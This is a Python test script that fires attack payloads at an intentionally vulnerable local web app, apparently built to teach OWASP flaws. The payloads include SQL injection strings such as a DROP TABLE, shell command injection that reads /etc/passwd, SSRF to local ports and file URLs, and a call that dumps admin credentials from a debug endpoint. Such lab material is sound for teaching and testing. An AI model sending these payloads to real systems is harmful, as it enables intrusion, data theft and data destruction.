#!/usr/bin/env python3
"""
Test script for the vulnerable agentic agent.
This script tests the basic functionality to ensure the application works.
"""

import requests
import json
import time
import sys

def test_basic_functionality():
    """Test basic application functionality"""
    base_url = "http://localhost:8080"
    
    print("🧪 Testing Vulnerable Agentic Agent...")
    print("=" * 50)
    
    try:
        # Test 1: Check if application is running
        print("1. Testing application availability...")
        response = requests.get(f"{base_url}/", timeout=5)
        if response.status_code == 200:
            print("✅ Application is running")
        else:
            print(f"❌ Application returned status code: {response.status_code}")
            return False
            
        # Test 2: Test debug endpoint (exposed information)
        print("\n2. Testing debug endpoint...")
        response = requests.get(f"{base_url}/api/debug", timeout=5)
        if response.status_code == 200:
            debug_data = response.json()
            print("✅ Debug endpoint accessible")
            print(f"   - Database path: {debug_data.get('database_path', 'N/A')}")
            print(f"   - Admin credentials: {debug_data.get('admin_credentials', 'N/A')}")
        else:
            print(f"❌ Debug endpoint failed: {response.status_code}")
            
        # Test 3: Test SQL injection vulnerability
        print("\n3. Testing SQL injection vulnerability...")
        payload = "1 OR 1=1"
        response = requests.get(f"{base_url}/api/user_data?user_id={payload}", timeout=5)
        if response.status_code == 200:
            print("✅ SQL injection endpoint accessible")
            print(f"   - Response: {response.text[:100]}...")
        else:
            print(f"❌ SQL injection test failed: {response.status_code}")
            
        # Test 4: Test command injection vulnerability
        print("\n4. Testing command injection vulnerability...")
        payload = {"command": "ls -la"}
        response = requests.post(f"{base_url}/api/execute", 
                               json=payload, 
                               headers={'Content-Type': 'application/json'}, 
                               timeout=5)
        if response.status_code == 200:
            print("✅ Command injection endpoint accessible")
            result = response.json()
            print(f"   - Command executed: {result.get('result', 'N/A')[:100]}...")
        else:
            print(f"❌ Command injection test failed: {response.status_code}")
            
        # Test 5: Test SSRF vulnerability
        print("\n5. Testing SSRF vulnerability...")
        payload = {"url": f"{base_url}/api/debug"}
        response = requests.post(f"{base_url}/api/fetch_url", 
                               json=payload, 
                               headers={'Content-Type': 'application/json'}, 
                               timeout=5)
        if response.status_code == 200:
            print("✅ SSRF endpoint accessible")
            result = response.json()
            print(f"   - SSRF response: {result.get('content', 'N/A')[:100]}...")
        else:
            print(f"❌ SSRF test failed: {response.status_code}")
            
        # Test 6: Test agent execution
        print("\n6. Testing agent task execution...")
        payload = {"task": "system:ls -la", "user_id": 1}
        response = requests.post(f"{base_url}/api/agent/execute", 
                               json=payload, 
                               headers={'Content-Type': 'application/json'}, 
                               timeout=5)
        if response.status_code == 200:
            print("✅ Agent execution endpoint accessible")
            result = response.json()
            print(f"   - Task result: {result.get('result', 'N/A')[:100]}...")
        else:
            print(f"❌ Agent execution test failed: {response.status_code}")
            
        print("\n" + "=" * 50)
        print("🎉 All basic tests completed!")
        print("📝 The application is running and vulnerable endpoints are accessible.")
        print("⚠️  Remember: This is intentionally vulnerable for educational purposes.")
        
        return True
        
    except requests.exceptions.ConnectionError:
        print("❌ Could not connect to the application.")
        print("   Make sure the application is running on http://localhost:5000")
        return False
    except Exception as e:
        print(f"❌ Test failed with error: {e}")
        return False

def test_vulnerabilities():
    """Test specific vulnerability scenarios"""
    base_url = "http://localhost:8080"
    
    print("\n🔍 Testing Specific Vulnerability Scenarios...")
    print("=" * 50)
    
    try:
        # Test SQL injection with different payloads
        sql_payloads = [
            "1 OR 1=1",
            "1; DROP TABLE users; --",
            "1 UNION SELECT * FROM users --"
        ]
        
        print("1. Testing SQL Injection payloads:")
        for payload in sql_payloads:
            response = requests.get(f"{base_url}/api/user_data?user_id={payload}", timeout=5)
            print(f"   - Payload: {payload}")
            print(f"     Status: {response.status_code}")
            if response.status_code == 200:
                print(f"     Response: {response.text[:50]}...")
            print()
            
        # Test command injection with different commands
        cmd_payloads = [
            "ls -la",
            "whoami",
            "pwd",
            "ls -la; cat /etc/passwd"
        ]
        
        print("2. Testing Command Injection payloads:")
        for payload in cmd_payloads:
            response = requests.post(f"{base_url}/api/execute", 
                                   json={"command": payload}, 
                                   headers={'Content-Type': 'application/json'}, 
                                   timeout=5)
            print(f"   - Command: {payload}")
            print(f"     Status: {response.status_code}")
            if response.status_code == 200:
                result = response.json()
                print(f"     Result: {result.get('result', 'N/A')[:50]}...")
            print()
            
        # Test SSRF with different URLs
        ssrf_payloads = [
            f"{base_url}/api/debug",
            "http://127.0.0.1:22",
            "file:///etc/passwd"
        ]
        
        print("3. Testing SSRF payloads:")
        for payload in ssrf_payloads:
            response = requests.post(f"{base_url}/api/fetch_url", 
                                   json={"url": payload}, 
                                   headers={'Content-Type': 'application/json'}, 
                                   timeout=5)
            print(f"   - URL: {payload}")
            print(f"     Status: {response.status_code}")
            if response.status_code == 200:
                result = response.json()
                print(f"     Content: {result.get('content', 'N/A')[:50]}...")
            print()
            
        print("✅ Vulnerability testing completed!")
        
    except Exception as e:
        print(f"❌ Vulnerability testing failed: {e}")

if __name__ == "__main__":
    print("🚀 Starting Vulnerable Agentic Agent Tests")
    print("Make sure the application is running on http://localhost:8080")
    print()
    
    # Wait a moment for the application to start
    time.sleep(2)
    
    success = test_basic_functionality()
    
    if success:
        test_vulnerabilities()
    
    print("\n📚 Educational Notes:")
    print("- This application demonstrates OWASP Top 10 vulnerabilities")
    print("- All vulnerabilities are intentionally implemented for learning")
    print("- Use this knowledge to build more secure applications")
    print("- Never use vulnerable code in production environments") 